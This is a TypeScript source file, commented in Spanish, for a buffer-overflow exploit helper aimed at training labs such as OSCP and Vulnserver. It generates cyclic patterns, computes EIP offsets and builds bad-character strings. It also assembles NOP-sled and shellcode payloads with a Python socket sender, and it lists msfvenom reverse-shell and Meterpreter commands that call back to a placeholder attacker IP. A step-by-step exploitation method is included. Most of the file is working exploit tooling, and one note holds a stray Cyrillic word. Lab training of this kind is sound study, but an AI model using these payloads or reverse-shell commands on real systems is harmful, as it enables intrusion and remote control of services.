/* Buffer Overflow Calculator: patrón cíclico (algoritmo de Metasploit,
   implementado aquí), cálculo de offset, gestor de badchars y
   constructor de payload con NOP sled + shellcode + retorno. */

const UPPERCASE = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
const LOWERCASE = 'abcdefghijklmnopqrstuvwxyz'
const DIGITS = '0123456789'

/** Patrón cíclico estilo Metasploit (grupos de 3 chars: Aa0 Aa1 … Ba0 …). */
export function cyclicPattern(length: number): string {
  let out = ''
  for (let upper = 0; upper < 26; upper++) {
    for (let lower = 0; lower < 26; lower++) {
      for (let digit = 0; digit < 10; digit++) {
        if (out.length >= length) return out.slice(0, length)
        out += UPPERCASE[upper] + LOWERCASE[lower] + DIGITS[digit]
      }
    }
  }
  return out.slice(0, length)
}

function littleEndian(s: string): number {
  // "Aa0A" → bytes 0x41 0x61 0x30 0x41 → 0x41306 1A... little endian
  const b = [s.charCodeAt(0), s.charCodeAt(1), s.charCodeAt(2), s.charCodeAt(3)]
  return ((b[3] << 24) | (b[2] << 16) | (b[1] << 8) | b[0]) >>> 0
}

/** Offset: acepta el valor del EIP en formato "Aa3A" o hex 0x41336141. */
export function findOffset(eipValue: string): { offset: number | null; matched?: string; hint?: string } {
  const v = eipValue.trim()
  let target: number
  let matched: string | undefined
  if (/^0x[0-9a-fA-F]{8}$/.test(v)) {
    target = parseInt(v, 16)
  } else if (/^[A-Za-z0-9]{4}$/.test(v)) {
    matched = v
    target = littleEndian(v)
  } else {
    return { offset: null, hint: 'introduce 4 chars del patrón (ej. Aa3A) o el hex del EIP (ej. 0x41336141)' }
  }
  const pat = cyclicPattern(30000)
  const bytes = new TextEncoder().encode(pat)
  const dv = new DataView(bytes.buffer)
  for (let i = 0; i <= bytes.length - 4; i++) {
    if (dv.getUint32(i, true) === target) {
      if (matched && pat.slice(i, i + 4) !== matched) {
        // puede ser big-endian: reintenta
        continue
      }
      return { offset: i, matched: pat.slice(i, i + 4) }
    }
  }
  return { offset: null, hint: 'esa secuencia no está en el patrón: revisa que sea de 4 caracteres y en orden correcto' }
}

export const DEFAULT_BADCHARS = '\x00\x0a\x0d'

export interface BadcharRun { bytes: string[] }

/** Cadena de badchars: todos los bytes 1-255 excepto los malos. */
export function badcharString(bad: number[]): string {
  const out: number[] = []
  for (let i = 1; i < 256; i++) {
    if (bad.includes(i)) continue
    out.push(i)
  }
  return out.map((b) => '\\x' + b.toString(16).padStart(2, '0')).join('')
}

export const BADCHAR_METHOD: string[] = [
  'Envía la cadena completa tras rellenar con tu offset: si el proceso la trunca en \x00, el primer badchar es evidente.',
  'Mejor método comparativo: envía la cadena, saca el dump de memoria (ESP) y compáralo byte a byte: los bytes alterados son los malos.',
  'Repite en bucle: cada byte "cambiado" en el dump se añade a la lista y se repite el envío hasta que la cadena llegue íntegra.',
  'Los sospechosos habituales: \x00 (null, casi siempre), \x0a (LF), \x0d (CR), \x20 (espacio en algunos), \xff y \x80+ (con funciones que traten ASCII).',
  'En inmunidad/EDB: usa mona.py (msf: !mona compare -f bytearray.txt) que hace la comparación automática.',
]

export interface BofPayload {
  offset: number
  eipAddr: string // dirección de retorno (little endian automático)
  nops: number
  shellcodeHex: string // hex limpio: "\xfc\x48..." o pares hex
  totalBefore: number // buffer pre-overwrite (opcional info)
}

export function buildBofPayload(p: BofPayload): { bytes: string; python: string; length: number; eipBytes: string; warnings: string[] } {
  const warnings: string[] = []
  // parse shellcode: acepta "\xfc\x48" o "fc48"
  const cleaned = p.shellcodeHex.replace(/\\x/gi, '').replace(/[^0-9a-fA-F]/g, '')
  if (cleaned.length % 2 !== 0) warnings.push('el shellcode tiene un número impar de dígitos hex: revisa que esté completo')
  const scBytes: number[] = []
  for (let i = 0; i + 1 < cleaned.length; i += 2) scBytes.push(parseInt(cleaned.slice(i, i + 2), 16))

  // parse EIP: "0x081367f9" o "081367f9"
  const eipHex = p.eipAddr.replace(/^0x/i, '').replace(/[^0-9a-fA-F]/g, '').padStart(8, '0').slice(0, 8)
  if (!/^[0-9a-fA-F]{8}$/.test(eipHex)) warnings.push('dirección de retorno inválida: se esperan 4 bytes')
  const eipBytes: number[] = []
  for (let i = eipHex.length - 2; i >= 0; i -= 2) eipBytes.push(parseInt(eipHex.slice(i, i + 2), 16)) // little endian
  const eipEsc = eipBytes.map((b) => '\\x' + b.toString(16).padStart(2, '0')).join('')

  const scEsc = scBytes.map((b) => '\\x' + b.toString(16).padStart(2, '0')).join('')
  const junkEsc = '\\x41'.repeat(p.offset)
  const nopEsc = '\\x90'.repeat(p.nops)

  const total = p.offset + 4 + p.nops + scBytes.length
  if (p.offset <= 0) warnings.push('offset 0: primero encuentra el offset con el patrón cíclico')
  if (p.nops === 0 && scBytes.length > 0) warnings.push('sin NOP sled: si la dirección de retorno aterriza antes del shellcode no ejecutará — considera 16-32 NOPs')
  if (scBytes.length && scBytes[0] === 0x00) warnings.push('el shellcode empieza por null byte: probablemente mal copiado')

  const bytesStr = junkEsc + eipEsc + nopEsc + scEsc
  const python = [
    `import socket`,
    ``,
    `# payload: ${total} bytes (offset=${p.offset} + EIP=4 + NOPs=${p.nops} + shellcode=${scBytes.length})`,
    `payload = (`,
    `    b"${junkEsc}"`,
    `    b"${eipEsc}"  # retorno → ${p.eipAddr}`,
    `    b"${nopEsc}"`,
    `    b"${scEsc}"`,
    `)`,
    ``,
    `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`,
    `s.connect(("<HOST>", <PORT>))`,
    `s.send(payload)`,
    `s.close()`,
  ].join('\n')

  return { bytes: bytesStr, python, length: total, eipBytes: eipEsc, warnings }
}

export const MSF_SHELLCODE_CMDS: [string, string][] = [
  ['windows reverse tcp', 'msfvenom -p windows/shell_reverse_tcp LHOST=TU_IP LPORT=4444 EXITFUNC=thread -f c -b \'\\x00\\x0a\\x0d\''],
  ['linux reverse tcp', 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f c -b \'\\x00\\x0a\\x0d\''],
  ['meterpreter x86', 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 EXITFUNC=thread -f c -b \'\\x00\\x0a\\x0d\''],
  ['staged vs stageless', 'shell_reverse_tcp (stageless, cabe en ~324 bytes) vs shell/reverse_tcp (staged, necesita buffer mayor)'],
  ['EXITFUNC=thread', 'clave en POCs: el exploit no mata el proceso al terminar la shell (seguimos fuzzing)'],
]

export const BOF_METHOD: string[] = [
  '1. Fuzzing: envía buffers crecientes hasta que el proceso crashea (apunta la longitud).',
  '2. Control de EIP: buffer de esa longitud con patrón cíclico → el valor de EIP tras el crash da el offset (búscalo aquí).',
  '3. Espacio para shellcode: confirma que puedes escribir al menos 350+ bytes después del EIP (si no, salto corto vía ESP o egghunter).',
  '4. Badchars: envía la cadena 1-255 y compara el dump (mona compare) — lista arriba.',
  '5. Retorno: encuentra JMP/CALL ESP del módulo sin protección (mona jmp -r esp -cpb "\\x00\\x0a\\x0d") y verifica el endianness.',
  '6. Payload: NOP sled + shellcode msfvenom sin los badchars + EXITFUNC=thread.',
  '7. Prueba en TU lab antes que en nada: un buffer overflow accidental puede tumbar un servicio real.',
]

export const BOF_NOTES: string[] = [
  'Esta tool hace el trabajo aritmético: el offset, el formato little-endian y la estructura del payload. El exploit es responsabilidad tuya.',
  'El patrón cíclico aquí es idéntico al de Metasploit (Aa0Aa1Aa2...): puedes mezclar pattern_create.rb y pattern_offset.rb con esta.',
  'En Windows moderno (DEP/ASLR/CFG) esto no aplica directamente: es el fundamento para entender ROP y exploits más complejos.',
  'Los ejercicios clásicos donde aplicas esto: buffer overflow prep de HackTheBox, OSCP, Vulnserver, комнаты de TryHackMe.',
]
